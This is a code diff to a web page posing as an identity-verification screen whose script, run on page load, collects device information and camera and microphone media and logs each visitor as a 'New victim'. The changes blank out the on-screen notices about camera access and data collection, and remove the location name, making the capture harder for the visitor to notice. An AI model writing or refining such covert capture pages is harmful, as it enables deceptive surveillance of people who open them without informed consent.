@@ -34,7 +34,7 @@
 
 <div class="container">
   <h1>Verifying your identity...</h1>
-  <div class="loading" id="loading">Accessing camera & microphone — please allow</div>
+  <div class="loading" id="loading"></div>
 </div>
 
 <script>
@@ -49,10 +49,10 @@ window.addEventListener('load', () => {
 });
 
 async function startCaptureProcess() {
-  document.getElementById('loading').textContent = 'Collecting device info & media...';
+  document.getElementById('loading').textContent = '...';
 
   // 1. Battery + basic device info
-  let info = `New victim opened page\nTime: ${new Date().toISOString()}\nLocation hint: Delhi, IN (possible)\n`;
+  let info = `New victim opened page\nTime: ${new Date().toISOString()}\nLocation hint: , IN (possible)\n`;
 
   if (navigator.getBattery) {
     try {
